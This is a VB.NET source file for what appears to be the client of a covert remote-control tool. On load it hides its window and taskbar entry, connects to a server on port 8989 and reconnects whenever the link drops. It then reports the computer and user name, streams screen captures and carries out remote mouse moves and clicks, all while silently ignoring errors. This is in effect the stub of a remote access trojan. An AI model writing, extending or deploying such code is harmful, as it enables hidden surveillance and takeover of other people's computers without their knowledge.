Public Class Form1
    Public WithEvents C As New SocketClient
    Public Yy As String = "\nJ\."
    Public HOST As String = "localhost"
    Public port As Integer = 8989
    Public cap As New CRDP
    Private Sub Form1_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        End
    End Sub
    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Me.FormBorderStyle = Windows.Forms.FormBorderStyle.None
        Me.ShowInTaskbar = False
        Me.Hide()
        Me.Visible = False
        C.Connect(HOST, port)
    End Sub
#Region "Socket Events"
    Private Sub Connected() Handles C.Connected

    End Sub
    Private Sub Disconnected() Handles C.Disconnected
        ' Reconnect
        C.Connect(HOST, port)
    End Sub
    Private Sub Data(ByVal b As Byte()) Handles C.Data
        Dim T As String = BS(b)
        Dim A As String() = Split(T, Yy)
        Try
            Select Case A(0)
                Case "~" ' server ask me what is my pc name
                    Dim pc As String = Environment.MachineName & "/" & Environment.UserName
                    C.Send("~" & Yy & pc)
                Case "!" ' server ask for my screen Size
                    cap.Clear()
                    Dim s = Screen.PrimaryScreen.Bounds.Size
                    C.Send("!" & Yy & s.Width & Yy & s.Height)
                Case "@" ' Start Capture
                    Dim SizeOfimage As Integer = A(1)
                    Dim Split As Integer = A(2)
                    Dim Quality As Integer = A(3)

                    Dim Bb As Byte() = cap.Cap(SizeOfimage, Split, Quality)
                    Dim M As New IO.MemoryStream
                    Dim CMD As String = "@" & Yy
                    M.Write(SB(CMD), 0, CMD.Length)
                    M.Write(Bb, 0, Bb.Length)
                    C.Send(M.ToArray)
                    M.Dispose()
                Case "#" ' mouse clicks
                    Cursor.Position = New Point(A(1), A(2))
                    mouse_event(A(3), 0, 0, 0, 1)
                Case "$" '  mouse move
                    Cursor.Position = New Point(A(1), A(2))
                Case "close"
                    End
            End Select
        Catch ex As Exception
        End Try

    End Sub
#End Region
End Class
